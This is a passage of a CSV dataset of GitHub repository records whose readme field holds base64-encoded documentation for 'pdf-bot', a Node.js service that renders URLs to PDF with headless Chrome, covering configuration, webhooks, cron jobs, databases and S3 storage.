name,id,description,language,open_issues,stargazers_count,topics,watchers,fork,forks_url,readme,config,travis0,travis1,travis2,travis3,travis4,travis5,travis6,travis7,travis8,travis9,travis10,travis11,travis12,travis13,travis14,travis15,travis16,travis17,travis18,travis19,travis20,travis21,travis22,travis23,gitlab0,gitlab1,gitlab2,gitlab3,gitlab4,gitlab5,gitlab6,gitlab7,gitlab8,gitlab9,gitlab10,gitlab11,gitlab12,gitlab13,gitlab14,gitlab15,gitlab16,gitlab17,gitlab18,gitlab19,gitlab20,gitlab21,gitlab22,gitlab23,jenkinsPipeline0,jenkinsPipeline1,jenkinsPipeline2,jenkinsPipeline3,jenkinsPipeline4,jenkinsPipeline5,jenkinsPipeline6,jenkinsPipeline7,jenkinsPipeline8,jenkinsPipeline9,jenkinsPipeline10,jenkinsPipeline11,jenkinsPipeline12,jenkinsPipeline13,jenkinsPipeline14,jenkinsPipeline15,jenkinsPipeline16,jenkinsPipeline17,jenkinsPipeline18,jenkinsPipeline19,jenkinsPipeline20,jenkinsPipeline21,jenkinsPipeline22,jenkinsPipeline23,cirrus0,cirrus1,cirrus2,cirrus3,cirrus4,cirrus5,cirrus6,cirrus7,cirrus8,cirrus9,cirrus10,cirrus11,cirrus12,cirrus13,cirrus14,cirrus15,cirrus16,cirrus17,cirrus18,cirrus19,cirrus20,cirrus21,cirrus22,cirrus23,github0,github1,github2,github3,github4,github5,github6,github7,github8,github9,github10,github11,github12,github13,github14,github15,github16,github17,github18,github19,github20,github21,github22,github23,cds0,cds1,cds2,cds3,cds4,cds5,cds6,cds7,cds8,cds9,cds10,cds11,cds12,cds13,cds14,cds15,cds16,cds17,cds18,cds19,cds20,cds21,cds22,cds23,azure0,azure1,azure2,azure3,azure4,azure5,azure6,azure7,azure8,azure9,azure10,azure11,azure12,azure13,azure14,azure15,azure16,azure17,azure18,azure19,azure20,azure21,azure22,azure23,circleci0,circleci1,circleci2,circleci3,circleci4,circleci5,circleci6,circleci7,circleci8,circleci9,circleci10,circleci11,circleci12,circleci13,circleci14,circleci15,circleci16,circleci17,circleci18,circleci19,circleci20,circleci21,circleci22,circleci23,bitbucket0,bitbucket1,bitbucket2,bitbucket3,bitbucket4,bitbucket5,bitbucket6,bitbucket7,bitbucket8,bitbucket9,bitbucket10,bitbucket11,bitbucket12,bitbucket13,bitbucket14,bitbucket15,bitbucket16,bitbucket17,bitbucket18,bitbucket19,bitbucket20,bitbucket21,bitbucket22,bitbucket23
biB5b3VyICRQQVRICgpgcGRmLWJvdCBpbnN0YWxsYCB3aWxsIHByb21wdCBm
b3Igc29tZSBiYXNpYyBjb25maWd1cmF0aW9ucyBhbmQgdGhlbiBjcmVhdGUg
YSBzdG9yYWdlIGZvbGRlciB3aGVyZSB5b3VyIGRhdGFiYXNlIGFuZCBwZGYg
ZmlsZXMgd2lsbCBiZSBzYXZlZC4KCiMjIyBDb25maWd1cmF0aW9uCgpgcGRm
LWJvdGAgY29tZXMgcGFja2FnZWQgd2l0aCBzZW5zaWJsZSBkZWZhdWx0cy4g
QXQgdGhlIHZlcnkgbWluaW11bSB5b3UgbXVzdCBoYXZlIGEgY29uZmlnIGZp
bGUgaW4gdGhlIHNhbWUgZm9sZGVyIGZyb20gd2hpY2ggeW91IGFyZSBleGVj
dXRpbmcgYHBkZi1ib3RgIHdpdGggYSBgc3RvcmFnZVBhdGhgIGdpdmVuLiBI
b3dldmVyLCBpbiByZWFsaXR5IHdoYXQgeW91IHByb2JhYmx5IHdhbnQgdG8g
ZG8gaXMgdXNlIHRoZSBgcGRmLWJvdCBpbnN0YWxsYCBjb21tYW5kIHRvIGdl
bmVyYXRlIGEgY29uZmlndXJhdGlvbiBmaWxlIGFuZCB0aGVuIHVzZSBhbiBh
bGlhcyBgQUxJQVMgcGRmLWJvdCA9ICJwZGYtYm90IC1jIC9ob21lL3BkZi1i
b3QuY29uZmlnLmpzImAKCmBwZGYtYm90LmNvbmZpZy5qc2AKYGBganMKdmFy
IGh0bWxQZGYgPSByZXF1aXJlKCdodG1sLXBkZi1jaHJvbWUnKQoKbW9kdWxl
LmV4cG9ydHMgPSB7CiAgYXBpOiB7CiAgICB0b2tlbjogJ2NyYXp5LXNlY3Jl
dCcKICB9LAogIGdlbmVyYXRvcjogewogICAgY29tcGxldGlvblRyaWdnZXI6
IG5ldyBodG1sUGRmLkNvbXBsZXRpb25UcmlnZ2VyLlRpbWVyKDEwMDApIC8v
IDEgc2VjIHRpbWVvdXQKICB9LAogIHN0b3JhZ2VQYXRoOiAnc3RvcmFnZScK
fQpgYGAKCmBgYGJhc2gKJCBwZGYtYm90IC1jIC4vcGRmLWJvdC5jb25maWcu
anMgcHVzaCBodHRwczovL2VzYmVucC5naXRodWIuaW8KYGBgCgpbU2VlIGEg
ZnVsbCBsaXN0IG9mIHRoZSBhdmFpbGFibGUgY29uZmlndXJhdGlvbiBvcHRp
b25zLl0oI29wdGlvbnMpCgojIyBVc2FnZSBndWlkZQoKIyMjIFN0cnVjdHVy
ZSBhbmQgY29uY2VwdAoKYHBkZi1ib3RgIGlzIG1lYW50IHRvIGJlIGEgbWlj
cm9zZXJ2aWNlIHRoYXQgcnVucyBhIHNlcnZlciB0byBnZW5lcmF0ZSBQREZz
IGZvciB5b3UuIFRoYXQgdXN1YWxseSBtZWFucyB5b3Ugd2lsbCBzZW5kIHJl
cXVlc3RzIGZyb20geW91ciBhcHBsaWNhdGlvbiBzZXJ2ZXIgdG8gdGhlIFBE
RiBzZXJ2ZXIgdG8gcmVxdWVzdCBhbiB1cmwgdG8gYmUgZ2VuZXJhdGVkIGFz
IGEgUERGLiBgcGRmLWJvdGAgd2lsbCBtYW5hZ2UgYSBxdWV1ZSBhbmQgcmV0
cnkgZmFpbGVkIGdlbmVyYXRpb25zLiBPbmNlIGEgam9iIGlzIHN1Y2Nlc3Nm
dWxseSBnZW5lcmF0ZWQgYSBwYXRoIHRvIGl0IHdpbGwgYmUgc2VudCBiYWNr
IHRvIHlvdXIgYXBwbGljYXRpb24gc2VydmVyLgoKTGV0IHVzIGNoZWNrIG91
dCB0aGUgZmxvdyBmb3IgYW4gYXBwIHRoYXQgZ2VuZXJhdGVzIFBERiBpbnZv
aWNlcy4KCmBgYAoxLiAoQXBwIHNlcnZlcik6IEFuIGludm9pY2UgaXMgY3Jl
YXRlZCAtLS0tPiBTZW5kIFVSTCB0byBpbnZvaWNlIHRvIHBkZi1ib3Qgc2Vy
dmVyCjIuIChwZGYtYm90IHNlcnZlcik6IFB1dCB0aGUgVVJMIGluIHRoZSBx
dWV1ZQozLiAocGRmLWJvdCBzZXJ2ZXIpOiBQREYgaXMgZ2VuZXJhdGVkIHVz
aW5nIGhlYWRsZXNzIENocm9tZQo0LiAocGRmLWJvdCBzZXJ2ZXIpOiAoaWYg
ZmFpbGVkIHRyeSBhZ2FpbiB1c2luZyAxIG1pbiwgMyBtaW4sIDEwIG1pbiwg
MzAgbWluLCA2MCBtaW4gZGVsYXkpCjUuIChwZGYtYm90IHNlcnZlcik6IFVw
bG9hZCBQREYgdG8gc3RvcmFnZSAoZS5nLiBBbWF6b24gUzMpCjYuIChwZGYt
Ym90IHNlcnZlcik6IFNlbmQgUzMgbG9jYXRpb24gb2YgUERGIGJhY2sgdG8g
dGhlIGFwcCBzZXJ2ZXIKNy4gKEFwcCBzZXJ2ZXIpOiBSZWNlaXZlIFMzIGxv
Y2F0aW9uIG9mIFBERiAtPiBDaGVjayBzaWduYXR1cmUgc3VtIG1hdGNoZXMg
Zm9yIHNlY3VyaXR5CjguIChBcHAgc2VydmVyKTogSGFuZGxlIFBERiBob3dl
dmVyIHlvdSBzZWUgZml0IChtb3ZlIGl0LCBkb3dubG9hZCBpdCwgc2F2ZSBp
dCBldGMuKQpgYGAKCllvdSBjYW4gc2VuZCBtZXRhIGRhdGEgdG8gdGhlIGBw
ZGYtYm90YCBzZXJ2ZXIgdGhhdCB3aWxsIGJlIHNlbnQgYmFjayB0byB0aGUg
YXBwbGljYXRpb24uIFRoaXMgY2FuIGhlbHAgeW91IGlkZW50aWZ5IHdoYXQg
UERGIHlvdSBhcmUgcmVjZWl2aW5nLgoKIyMjIFNldHVwCgpPbiB5b3VyIGBw
ZGYtYm90YCBzZXJ2ZXIgc3RhcnQgYnkgY3JlYXRpbmcgYSBjb25maWcgZmls
ZSBgcGRmLWJvdC5jb25maWcuanNgLiBbWW91IGNhbiBzZWUgYW4gZXhhbXBs
ZSBmaWxlIGhlcmVdKGh0dHBzOi8vZ2l0aHViLmNvbS9lc2JlbnAvcGRmLWJv
dC9ibG9iL21hc3Rlci9leGFtcGxlcy9wZGYtYm90LmNvbmZpZy5qcykKCmBw
ZGYtYm90LmNvbmZpZy5qc2AKYGBganMKbW9kdWxlLmV4cG9ydHMgPSB7CiAg
YXBpOiB7CiAgICBwb3J0OiAzMDAwLAogICAgdG9rZW46ICdhcGktdG9rZW4n
CiAgfSwKICBzdG9yYWdlOiB7CiAgICAnczMnOiBjcmVhdGVTM0NvbmZpZyh7
CiAgICAgIGJ1Y2tldDogJycsCiAgICAgIGFjY2Vzc0tleUlkOiAnJywKICAg
ICAgcmVnaW9uOiAnJywKICAgICAgc2VjcmV0QWNjZXNzS2V5OiAnJwogICAg
fSkKICB9LAogIHdlYmhvb2s6IHsKICAgIHNlY3JldDogJzEyMzQnLAogICAg
dXJsOiAnaHR0cDovL2xvY2FsaG9zdDozMDAwL3dlYmhvb2tzL3BkZicKICB9
Cn0KYGBgCgpBcyBhIG1pbmltdW0geW91IHNob3VsZCBjb25maWd1cmUgYW4g
YWNjZXNzIHRva2VuIGZvciB5b3VyIEFQSS4gVGhpcyB3aWxsIGJlIHVzZWQg
dG8gYXV0aGVudGljYXRlIGpvYnMgc2VudCB0byB5b3VyIGBwZGYtYm90YCBz
ZXJ2ZXIuIFlvdSBhbHNvIG5lZWQgdG8gYWRkIGEgYHdlYmhvb2tgIGNvbmZp
Z3VyYXRpb24gdG8gaGF2ZSBwZGYgbm90aWZpY2F0aW9ucyBzZW50IGJhY2sg
dG8geW91ciBhcHBsaWNhdGlvbiBzZXJ2ZXIuIFlvdSBzaG91bGQgYWRkIGEg
YHNlY3JldGAgdGhhdCB3aWxsIGJlIHVzZWQgdG8gZ2VuZXJhdGUgYSBzaWdu
YXR1cmUgdXNlZCB0byBjaGVjayB0aGF0IHRoZSByZXF1ZXN0IGhhcyBub3Qg
YmVlbiB0YW1wZXJlZCB3aXRoIGR1cmluZyB0cmFuc2Zlci4KClN0YXJ0IHlv
dXIgQVBJIHVzaW5nCgpgcGRmLWJvdCAtYyAuL3BkZi1ib3QuY29uZmlnLmpz
IGFwaWAKClRoaXMgd2lsbCBzdGFydCBhbiBbZXhwcmVzcyBzZXJ2ZXJdKGh0
dHA6Ly9leHByZXNzanMuY29tKSB0aGF0IGxpc3RlbnMgZm9yIG5ldyBqb2Jz
IG9uIHBvcnQgYDMwMDBgLgoKIyMjIyBTZXR0aW5nIHVwIENocm9tZQoKYHBk
Zi1ib3RgIHVzZXMgW2h0bWwtcGRmLWNocm9tZV0oaHR0cHM6Ly9naXRodWIu
Y29tL3dlc3R5OTIvaHRtbC1wZGYtY2hyb21lKSB3aGljaCBpbiB0dXJucyB1
c2VzIFtjaHJvbWUtbGF1bmNoZXJdKGh0dHBzOi8vZ2l0aHViLmNvbS9Hb29n
bGVDaHJvbWUvbGlnaHRob3VzZS90cmVlL21hc3Rlci9jaHJvbWUtbGF1bmNo
ZXIpIHRvIGxhdW5jaCBjaHJvbWUuIFlvdSBzaG91bGQgY2hlY2sgb3V0IHRo
b3NlIHR3byByZXNvdXJjZXMgb24gaG93IHRvIHByb3Blcmx5IHNldHVwIENo
cm9tZS4gSG93ZXZlciwgd2l0aCBgY2hyb21lLWxhdW5jaGVyYCBDaHJvbWUg
c2hvdWxkIGJlIHN0YXJ0ZWQgYXV0b21hdGljYWxseS4gT3RoZXJ3aXNlLCBg
aHRtbC1wZGYtY2hyb21lYCBoYXMgYSBzbWFsbCBndWlkZSBvbiBob3cgdG8g
aGF2ZSBpdCBydW5uaW5nIGFzIGEgcHJvY2VzcyB1c2luZyBgcG0yYC4KCllv
dSBjYW4gaW5zdGFsbCBjaHJvbWUgb24gVWJ1bnR1IHVzaW5nCgpgYGAKc3Vk
byBhcHQtZ2V0IHVwZGF0ZSAmJiBhcHQtZ2V0IGluc3RhbGwgY2hyb21pdW0t
YnJvd3NlcgpgYGAKCklmIHlvdSBhcmUgdGVzdGluZyB0aGluZ3Mgb24gT1NY
IG9yIHNpbWlsYXIsIGBjaHJvbWUtbGF1bmNoZXJgIHNob3VsZCBiZSBhYmxl
IHRvIGZpbmQgYW5kIGF1dG9tYXRpY2FsbHkgc3RhcnR1cCBDaHJvbWUgZm9y
IHlvdS4KCiMjIyMgU2V0dGluZyB1cCB0aGUgcmVjZWl2aW5nIEFQSQoKSW4g
dGhlIFtleGFtcGxlcyBmb2xkZXJdKGh0dHBzOi8vZ2l0aHViLmNvbS9lc2Jl
bnAvcGRmLWJvdC9ibG9iL21hc3Rlci9leGFtcGxlcy9yZWNlaXZpbmctYXBp
LmpzKSB0aGVyZSBpcyBhIHNtYWxsIGV4YW1wbGUgb24gaG93IHRoZSBhcHBs
aWNhdGlvbiBBUEkgY291bGQgbG9vay4gQmFzaWNhbGx5LCB5b3UganVzdCBo
YXZlIHRvIGRlZmluZSBhbiBlbmRwb2ludCB0aGF0IHdpbGwgcmVjZWl2ZSB0
aGUgd2ViaG9vayBhbmQgY2hlY2sgdGhhdCB0aGUgc2lnbmF0dXJlIG1hdGNo
ZXMuCgpgYGBqYXZhc2NyaXB0CmFwaS5wb3N0KCcvaG9vaycsIGZ1bmN0aW9u
IChyZXEsIHJlcykgewogIHZhciBzaWduYXR1cmUgPSByZXEuZ2V0KCdYLVBE
Ri1TaWduYXR1cmUnLCAnc2hhMT0nKQoKICB2YXIgYm9keUNyeXB0ZWQgPSBy
ZXF1aXJlKCdjcnlwdG8nKQogICAgLmNyZWF0ZUhtYWMoJ3NoYTEnLCAnMTIz
NDUnKQogICAgLnVwZGF0ZShKU09OLnN0cmluZ2lmeShyZXEuYm9keSkpCiAg
ICAuZGlnZXN0KCdoZXgnKQoKICBpZiAoYm9keUNyeXB0ZWQgIT09IHNpZ25h
dHVyZSkgewogICAgcmVzLnN0YXR1cyg0MDEpLnNlbmQoKQogICAgcmV0dXJu
CiAgfQoKICBjb25zb2xlLmxvZygnUERGIHdlYmhvb2sgcmVjZWl2ZWQnLCBK
U09OLnN0cmluZ2lmeShyZXEuYm9keSkpCgogIHJlcy5zdGF0dXMoMjA0KS5z
ZW5kKCkKfSkKYGBgCgojIyMgU2V0dXAgcHJvZHVjdGlvbiBlbnZpcm9ubWVu
dAoKW0ZvbGxvdyB0aGUgZ3VpZGUgdW5kZXIgYHByb2R1Y3Rpb24vYCB0byBz
ZWUgaG93IHRvIHNldHVwIGBwZGYtYm90YCB1c2luZyBgcG0yYCBhbmQgYG5n
aW54YF0oaHR0cHM6Ly9naXRodWIuY29tL2VzYmVucC9wZGYtYm90L2Jsb2Iv
bWFzdGVyL3Byb2R1Y3Rpb24vUkVBRE1FLm1kKQoKIyMjIFNldHVwIGNyb250
YWIKCldlIHNldHVwIG91ciBjcm9udGFiIHRvIGNvbnRpbnVvdXNseSBsb29r
IGZvciBqb2JzIHRoYXQgaGF2ZSBub3QgeWV0IGJlZW4gY29tcGxldGVkLgoK
YGBgYmFzaAoqICogKiAqICogbm9kZSAkKG5wbSBiaW4gLWcpL3BkZi1ib3Qg
LWMgLi9wZGYtYm90LmNvbmZpZy5qcyBzaGlmdDphbGwgPj4gL3Zhci9sb2cv
cGRmYm90LmxvZyAyPiYxCiogKiAqICogKiBub2RlICQobnBtIGJpbiAtZykv
cGRmLWJvdCAtYyAuL3BkZi1ib3QuY29uZmlnLmpzIHBpbmc6cmV0cnktZmFp
bGVkID4+IC92YXIvbG9nL3BkZmJvdC5sb2cgMj4mMQpgYGAKCiMjIyBRdWlj
ayBleGFtcGxlIHVzaW5nIHRoZSBDTEkKCkxldCB1cyBhc3N1bWUgSSB3YW50
IHRvIGdlbmVyYXRlIGEgUERGIGZvciBgaHR0cHM6Ly9lc2JlbnAuZ2l0aHVi
LmlvYC4gSSBjYW4gYWRkIHRoZSBqb2IgdXNpbmcgdGhlIGBwZGYtYm90YCBD
TEkuCgpgYGBiYXNoCiQgcGRmLWJvdCAtYyAuL3BkZi1ib3QuY29uZmlnLmpz
IHB1c2ggaHR0cHM6Ly9lc2JlbnAuZ2l0aHViLmlvIC0tbWV0YSAneyJpZCI6
MX0nCmBgYAoKTmV4dCwgaWYgbXkgY3JvbnRhYiBpcyBub3Qgc2V0dXAgdG8g
cnVuIGl0IGF1dG9tYXRpY2FsbHkgSSBjYW4gcnVuIGl0IHVzaW5nIHRoZSBg
c2hpZnQ6YWxsYCBjb21tYW5kCgpgYGBiYXNoCiQgcGRmLWJvdCAtYyAuL3Bk
Zi1ib3QuY29uZmlnLmpzIHNoaWZ0OmFsbApgYGAKClRoaXMgd2lsbCBsb29r
IGZvciB0aGUgb2xkZXN0IHVuY29tcGxldGVkIGpvYiBhbmQgcnVuIGl0LgoK
IyMjIEhvdyBjYW4gSSBnZW5lcmF0ZSBQREZzIGZvciBzaXRlcyB0aGF0IHVz
ZSBKYXZhc2NyaXB0PwoKVGhpcyBpcyBhIGNvbW1vbiBpc3N1ZSB3aXRoIFBE
RiBnZW5lcmF0aW9uLiBMdWNraWx5LCBgaHRtbC1wZGYtY2hyb21lYCBoYXMg
YSByZWFsbHkgYXdlc29tZSBBUEkgZm9yIGRlYWxpbmcgd2l0aCBKYXZhc2Ny
aXB0LiBZb3UgY2FuIHNwZWNpZnkgYSB0aW1lb3V0IGluIG1pbGxpc2Vjb25k
cywgd2FpdCBmb3IgZWxlbWVudHMgb3IgY3VzdG9tIGV2ZW50cy4gVG8gYWRk
IGEgd2FpdCBzaW1wbHkgY29uZmlndXJlIHRoZSBgZ2VuZXJhdG9yYCBrZXkg
aW4geW91ciBjb25maWd1cmF0aW9uLiBCZWxvdyBhcmUgYSBmZXcgZXhhbXBs
ZXMuCgoqKldhaXQgZm9yIDUgc2Vjb25kcyoqCgpgYGBqYXZhc2NyaXB0CnZh
ciBodG1sUGRmID0gcmVxdWlyZSgnaHRtbC1wZGYtY2hyb21lJykKCm1vZHVs
ZS5leHBvcnRzID0gewogIGFwaTogewogICAgdG9rZW46ICdhcGktdG9rZW4n
CiAgfSwKICAvLyBodG1sLXBkZi1jaHJvbWUgb3B0aW9ucwogIGdlbmVyYXRv
cjogewogICAgY29tcGxldGlvblRyaWdnZXI6IG5ldyBodG1sUGRmLkNvbXBs
ZXRpb25UcmlnZ2VyLlRpbWVyKDUwMDApLCAvLyB3YWl0cyBmb3IgNSBzZWMK
ICB9LAogIHdlYmhvb2s6IHsKICAgIHNlY3JldDogJzEyMzQnLAogICAgdXJs
OiAnaHR0cDovL2xvY2FsaG9zdDozMDAwL3dlYmhvb2tzL3BkZicKICB9Cn0K
YGBgCgoqKldhaXQgZm9yIGV2ZW50KioKCmBgYGphdmFzY3JpcHQKdmFyIGh0
bWxQZGYgPSByZXF1aXJlKCdodG1sLXBkZi1jaHJvbWUnKQoKbW9kdWxlLmV4
cG9ydHMgPSB7CiAgYXBpOiB7CiAgICB0b2tlbjogJ2FwaS10b2tlbicKICB9
LAogIC8vIGh0bWwtcGRmLWNocm9tZSBvcHRpb25zCiAgZ2VuZXJhdG9yOiB7
CiAgICBjb21wbGV0aW9uVHJpZ2dlcjogbmV3IGh0bWxQZGYuQ29tcGxldGlv
blRyaWdnZXIuRXZlbnQoCiAgICAgICdteUV2ZW50JywgLy8gbmFtZSBvZiB0
aGUgZXZlbnQgdG8gbGlzdGVuIGZvcgogICAgICAnI215RWxlbWVudCcsIC8v
IG9wdGlvbmFsIERPTSBlbGVtZW50IENTUyBzZWxlY3RvciB0byBsaXN0ZW4g
b24sIGRlZmF1bHRzIHRvIGJvZHkKICAgICAgNTAwMCAvLyBvcHRpb25hbCB0
aW1lb3V0IChtaWxsaXNlY29uZHMpCiAgICApCiAgfSwKICB3ZWJob29rOiB7
CiAgICBzZWNyZXQ6ICcxMjM0JywKICAgIHVybDogJ2h0dHA6Ly9sb2NhbGhv
c3Q6MzAwMC93ZWJob29rcy9wZGYnCiAgfQp9CmBgYAoKSW4geW91ciBKYXZh
c2NyaXB0IHRyaWdnZXIgdGhlIGV2ZW50IHdoZW4gcmVuZGVyaW5nIGlzIGNv
bXBsZXRlCgpgYGBqYXZhc2NyaXB0CmRvY3VtZW50LmdldEVsZW1lbnRCeUlk
KCdteUVsZW1lbnQnKS5kaXNwYXRjaEV2ZW50KG5ldyBDdXN0b21FdmVudCgn
bXlFdmVudCcpKTsKYGBgCgoqKldhaXQgZm9yIHZhcmlhYmxlKioKCmBgYGph
dmFzY3JpcHQKdmFyIGh0bWxQZGYgPSByZXF1aXJlKCdodG1sLXBkZi1jaHJv
bWUnKQoKbW9kdWxlLmV4cG9ydHMgPSB7CiAgYXBpOiB7CiAgICB0b2tlbjog
J2FwaS10b2tlbicKICB9LAogIC8vIGh0bWwtcGRmLWNocm9tZSBvcHRpb25z
CiAgZ2VuZXJhdG9yOiB7CiAgICBjb21wbGV0aW9uVHJpZ2dlcjogbmV3IGh0
bWxQZGYuQ29tcGxldGlvblRyaWdnZXIuVmFyaWFibGUoCiAgICAgICdteVZh
ck5hbWUnLCAvLyBvcHRpb25hbCwgbmFtZSBvZiB0aGUgdmFyaWFibGUgdG8g
d2FpdCBmb3IuICBEZWZhdWx0cyB0byAnaHRtbFBkZkRvbmUnCiAgICAgIDUw
MDAgLy8gb3B0aW9uYWwsIHRpbWVvdXQgKG1pbGxpc2Vjb25kcykKICAgICkK
ICB9LAogIHdlYmhvb2s6IHsKICAgIHNlY3JldDogJzEyMzQnLAogICAgdXJs
OiAnaHR0cDovL2xvY2FsaG9zdDozMDAwL3dlYmhvb2tzL3BkZicKICB9Cn0K
YGBgCgpJbiB5b3VyIEphdmFzY3JpcHQgc2V0IHRoZSB2YXJpYWJsZSB3aGVu
IHRoZSByZW5kZXJpbmcgaXMgY29tcGxldGUKCmBgYGphdmFzY3JpcHQKd2lu
ZG93Lm15VmFyTmFtZSA9IHRydWU7CmBgYAoKW1lvdSBjYW4gZmluZCBtb3Jl
IGNvbXBsZXRpb24gdHJpZ2dlcnMgaW4gaHRtbC1wZGYtY2hyb21lJ3MgZG9j
dW1lbnRhdGlvbl0oaHR0cHM6Ly9naXRodWIuY29tL3dlc3R5OTIvaHRtbC1w
ZGYtY2hyb21lI3RyaWdnZXItcmVuZGVyLWNvbXBsZXRpb24pCgojIyBBUEkK
CkJlbG93IGFyZSBnaXZlbiB0aGUgZW5kcG9pbnRzIHRoYXQgYXJlIGV4cG9z
ZWQgYnkgYHBkZi1zZXJ2ZXJgJ3MgUkVTVCBBUEkKCiMjIyBQdXNoIFVSTCB0
byBxdWV1ZTogUE9TVCAvCgprZXkgfCB0eXBlIHwgcmVxdWlyZWQgfCBkZXNj
cmlwdGlvbgotLS0gfCAtLS0tIHwgLS0tLS0tLS0gfCAtLS0tLS0tLS0tLQp1
cmwgfCBzdHJpbmcgfCB5ZXMgfCBUaGUgVVJMIHRvIGdlbmVyYXRlIGEgUERG
IGZyb20KbWV0YSB8IG9iamVjdCB8IHwgT3B0aW9uYWwgbWV0YSBkYXRhIG9i
amVjdCB0byBzZW5kIGJhY2sgdG8gdGhlIHdlYmhvb2sgdXJsCgojIyMjIEV4
YW1wbGUKCmBgYGJhc2gKY3VybCAtWCBQT1NUIC1IICdBdXRob3JpemF0aW9u
OiBCZWFyZXIgYXBpLXRva2VuJyAtSCAnQ29udGVudC1UeXBlOiBhcHBsaWNh
dGlvbi9qc29uJyBodHRwOi8vcGRmLWJvdC5jb20vIC1kICcKICB7CiAgICAi
dXJsIjoiaHR0cHM6Ly9lc2JlbnAuZ2l0aHViLmlvIiwKICAgICJtZXRhIjp7
CiAgICAgICJ0eXBlIjoiaW52b2ljZSIsCiAgICAgICJpZCI6MQogICAgfQog
IH0nCmBgYAoKIyMgRGF0YWJhc2UKCiMjIyBMb3dEQiAoZmlsZS1kYXRhYmFz
ZSkgKGRlZmF1bHQpCgpJZiB5b3UgaGF2ZSBsb3cgY29udXJyZW5jeSAocnVu
IGEgam9iIGV2ZXJ5IG5vdyBhbmQgdGhlbikgeW91IGNhbiB1c2UgdGhlIGRl
ZmF1bHQgZGF0YWJhc2UgZHJpdmVyIHRoYXQgdXNlcyBMb3dEQi4KCmBgYGph
dmFzY3JpcHQKdmFyIExvd0RCID0gcmVxdWlyZSgncGRmLWJvdC9zcmMvZGIv
bG93ZGInKQoKbW9kdWxlLmV4cG9ydHMgPSB7CiAgYXBpOiB7CiAgICB0b2tl
bjogJ2FwaS10b2tlbicKICB9LAogIGRiOiBMb3dEQih7CiAgICBsb3dEYk9w
dGlvbnM6IHt9LAogICAgcGF0aDogJycgLy8gZGVmYXVsdHMgdG8gJHN0b3Jh
Z2VQYXRoL2RiL2RiLmpzb24KICB9KSwKICB3ZWJob29rOiB7CiAgICBzZWNy
ZXQ6ICcxMjM0JywKICAgIHVybDogJ2h0dHA6Ly9sb2NhbGhvc3Q6MzAwMC93
ZWJob29rcy9wZGYnCiAgfQp9CmBgYAoKIyMjIFBvc3RncmVTUUwKCmBgYGph
dmFzY3JpcHQKdmFyIHBnc3FsID0gcmVxdWlyZSgncGRmLWJvdC9zcmMvZGIv
cGdzcWwnKQoKbW9kdWxlLmV4cG9ydHMgPSB7CiAgYXBpOiB7CiAgICB0b2tl
bjogJ2FwaS10b2tlbicKICB9LAogIGRiOiBwZ3NxbCh7CiAgICBkYXRhYmFz
ZTogJ3BkZmJvdCcsCiAgICB1c2VybmFtZTogJ3BkZmJvdCcsCiAgICBwYXNz
d29yZDogJ3BkZmJvdCcsCiAgICBwb3J0OiA1NDMyCiAgfSksCiAgd2ViaG9v
azogewogICAgc2VjcmV0OiAnMTIzNCcsCiAgICB1cmw6ICdodHRwOi8vbG9j
YWxob3N0OjMwMDAvd2ViaG9va3MvcGRmJwogIH0KfQpgYGAKCk9wdGlvbmFs
bHksIHlvdSBjYW4gc3BlY2lmeSBhIGRhdGFiYXNlIHVybCBieSBzcGVjaWZ5
aW5nIGEgYGNvbm5lY3Rpb25TdHJpbmdgLgoKVG8gaW5zdGFsbCB0aGUgbmVj
ZXNzYXJ5IGRhdGFiYXNlIHRhYmxlcywgcnVuIGBkYjptaWdyYXRlYC4gWW91
IGNhbiBhbHNvIGRlc3Ryb3kgdGhlIGRhdGFiYXNlIGJ5IHJ1bm5pbmcgYGRi
OmRlc3Ryb3lgLgoKIyMgU3RvcmFnZQoKQ3VycmVudGx5IGBwZGYtYm90YCBj
b21lcyBidW5kbGVkIHdpdGggYnVpbGQtaW4gc3VwcG9ydCBmb3Igc3Rvcmlu
ZyBQREZzIG9uIEFtYXpvbiBTMy4KCltGZWVsIGZyZWUgdG8gY29udHJpYnV0
ZSBhIFBSIGlmIHlvdSB3YW50IHRvIHNlZSBvdGhlciBzdG9yYWdlIHBsdWdp
bnMgaW4gYHBkZi1ib3RgXShodHRwczovL2dpdGh1Yi5jb20vZXNiZW5wL3Bk
Zi1ib3QvY29tcGFyZSkhCgojIyMgQW1hem9uIFMzCgpUbyBpbnN0YWxsIFMz
IHN0b3JhZ2UgYWRkIGEga2V5IHRvIHRoZSBgc3RvcmFnZWAgY29uZmlndXJh
dGlvbi4gTm90aWNlLCB5b3UgY2FuIGFkZCBhcyBtYW55IGRpZmZlcmVudCBs
b2NhdGlvbnMgeW91IHdhbnQgYnkgZ2l2aW5nIHRoZW0gZGlmZmVyZW50IGtl
eXMuCgpgYGBqYXZhc2NyaXB0CnZhciBjcmVhdGVTM0NvbmZpZyA9IHJlcXVp
cmUoJ3BkZi1ib3Qvc3JjL3N0b3JhZ2UvczMnKQoKbW9kdWxlLmV4cG9ydHMg
PSB7CiAgYXBpOiB7CiAgICB0b2tlbjogJ2FwaS10b2tlbicKICB9LAogIHN0
b3JhZ2U6IHsKICAgICdteV9zMyc6IGNyZWF0ZVMzQ29uZmlnKHsKICAgICAg
YnVja2V0OiAnW1lPVVIgQlVDS0VUIE5BTUVdJywKICAgICAgYWNjZXNzS2V5
SWQ6ICdbWU9VUiBBQ0NFU1MgS0VZIElEXScsCiAgICAgIHJlZ2lvbjogJ1tZ
T1VSIFJFR0lPTl0nLAogICAgICBzZWNyZXRBY2Nlc3NLZXk6ICdbWU9VUiBT
RUNSRVQgQUNDRVNTIEtFWV0nCiAgICB9KQogIH0sCiAgd2ViaG9vazogewog
ICAgc2VjcmV0OiAnMTIzNCcsCiAgICB1cmw6ICdodHRwOi8vbG9jYWxob3N0
OjMwMDAvd2ViaG9va3MvcGRmJwogIH0KfQoKYGBgCgojIyBPcHRpb25zCgpg
YGBqYXZhc2NyaXB0CnZhciBkZWNheVNjaGVkdWxlID0gWwogIDEwMDAgKiA2
